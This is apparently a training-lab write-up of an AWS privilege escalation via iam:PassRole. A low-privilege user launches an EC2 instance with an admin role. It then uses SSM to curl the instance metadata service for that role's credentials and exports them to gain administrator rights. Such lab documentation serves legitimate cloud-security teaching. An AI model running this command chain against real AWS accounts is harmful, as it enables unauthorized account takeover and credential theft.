### Pass Role : EC2

Configure the profile with the credentials provided. Then, list the policies attached to the user. Also, list inline policies attached to the user.

```
aws iam list-attached-user-policies --user-name student --profile PTAcademyJllerena
aws iam list-user-policies --user-name student --profile PTAcademyJllerena

```

![image](https://user-images.githubusercontent.com/46797181/222875109-e7bdae68-e3f5-4287-aeb7-507b8bc83216.png)


Attempt to create a user on the AWS account. `aws iam create-user --user-name jllerena --profile PTAcademyJllerena` A denied message is received 
![image](https://user-images.githubusercontent.com/46797181/222875129-893f9c02-3e0e-4f23-8ae6-b10c9f482c7e.png)

Check the policy permissions and details. `aws iam get-user-policy --user-name student --policy-name ConfigureEC2Role --profile PTAcademyJllerena` 
![image](https://user-images.githubusercontent.com/46797181/222875168-43144363-8658-4f2a-80c7-4bd2e3fd6484.png)

The student user can run EC2 instances and pass a role to the EC2 instance. Since the student user also has permission to interact with the SSM service, the student user can execute commands on the EC2 instances via SSM. List role on AWS account which can be passed to EC2 service. `aws iam list-roles --profile PTAcademyJllerena` 

![image](https://user-images.githubusercontent.com/46797181/222875518-d3d8cd2b-989d-4717-8ad9-9d44a9b4531c.png)

Check ec2admin role policies and permissions. `aws iam list-role-policies --role-name ec2admin --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/222875564-89c4e963-4626-46d8-b02a-b2d279a2c073.png)

Check policy permissions. `aws iam get-role-policy --role-name ec2admin --policy-name terraform-20230304040647411800000003 --profile PTAcademyJllerena` 
![image](https://user-images.githubusercontent.com/46797181/222875825-abad55e4-4966-4574-918e-90584843e934.png)

Find AMI id for Amazon Linux 2 AMI. `aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json --profile PTAcademyJllerena | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'`

The value obtained is `ami-07bf5557ac8caacca`
![image](https://user-images.githubusercontent.com/46797181/222876826-128122a8-3573-40ee-be28-0ba117df9acc.png)

Check the subnets available in the AWS account `aws ec2 describe-subnets --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/222877273-1e36b971-e35a-43c2-8a7f-01c189a9be89.png)

Take note of subnet id `subnet-0c344c41445db179a` 

Describe security groups `aws ec2 describe-security-groups --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/222877654-4470573b-8865-42ed-badb-0189e7af4922.png)

Take note of the security group ID `sg-085ec1c95a24f2950` 

List instance profiles for the AWS account. `aws iam list-instance-profiles --profile PTAcademyJllerena` 
![image](https://user-images.githubusercontent.com/46797181/222877770-11f75618-fae1-401e-a9b7-c33410cb64e2.png)

Take note of instance profile name `ec2_admin`

Start an ec2 instance using collected details. `aws ec2 run-instances --subnet-id subnet-0c344c41445db179a --image-id ami-07bf5557ac8caacca --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-085ec1c95a24f2950" --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222877971-1bafeef4-d464-4bdb-899c-69be1178e1db.png)

Run commands on the remote ec2 instance using SSM. `aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' --targets "Key=instanceids,Values=i-0a4021bfebd564014" --comment "aws cli 1 --profile PTAcademyJllerena"`

 ![image](https://user-images.githubusercontent.com/46797181/222878360-d734c9b0-9547-4602-99ee-685d627e65d3.png)
 
Get the command’s output using SSM. `aws ssm get-command-invocation --command-id "2caa2511-3e5b-4717-bb8e-5502ca79b548" --instance-id "i-0a4021bfebd564014" --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222878455-d79536e6-238b-4cd1-971e-2548882f9e43.png)

Take note of the access keys and configure the env variables 

```
export AWS_ACCESS_KEY_ID=<access key id>
export AWS_SECRET_ACCESS_KEY=<secret access key>
export AWS_SESSION_TOKEN=<session token>

```

Check caller identity to confirm whether assuming role was successful. `aws sts get-caller-identity`
![image](https://user-images.githubusercontent.com/46797181/222878679-c097f7ef-23ce-4e30-b9e7-237ff23e40a9.png)

Try creating a new user on the AWS account to verify Administrative privileges
![image](https://user-images.githubusercontent.com/46797181/222878713-1f698443-99cd-4940-8c3d-26b829549759.png)













